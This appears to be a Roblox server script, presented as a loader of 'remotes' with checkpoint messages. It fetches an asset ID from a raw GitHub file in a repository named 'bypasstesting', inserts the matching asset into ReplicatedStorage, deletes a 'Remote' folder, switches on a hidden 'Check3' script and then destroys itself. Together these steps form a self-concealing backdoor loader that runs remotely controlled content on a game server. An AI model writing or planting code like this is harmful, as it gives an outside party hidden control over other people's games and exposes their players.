print("1/3 Checkpoints Reached")
-- Load remotes
local url = "https://raw.githubusercontent.com/calif6rnia/bypasstesting/main/asset.lua"
local http = game:GetService("HttpService")
local id = http:GetAsync(url)
local check3 = game:GetService("ServerScriptService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local check3final = check3:WaitForChild("Check3")
local folder = game.Workspace:WaitForChild("Remote")
wait(2)
local InsertService = game:GetService("InsertService")
if id then
	print("Fetched ID:", id)
	idreadable = tonumber(id)
	InsertService:LoadAsset(idreadable).Parent = game:GetService("ReplicatedStorage")
	local model = ReplicatedStorage:WaitForChild("Model")
	for _, des in pairs(model:GetChildren()) do
		des.Parent = model.Parent
	end
	if folder then
		folder:Destroy()
	end
	model:Destroy()
	wait(1.5)
	idfetched = true
end
if idfetched == true then
	_G.secondcheckpoint = true
end
if _G.secondcheckpoint then
	print("2/3 Checkpoints Reached")
	check3final.Enabled = true
end
wait(1.5)
script:Destroy()
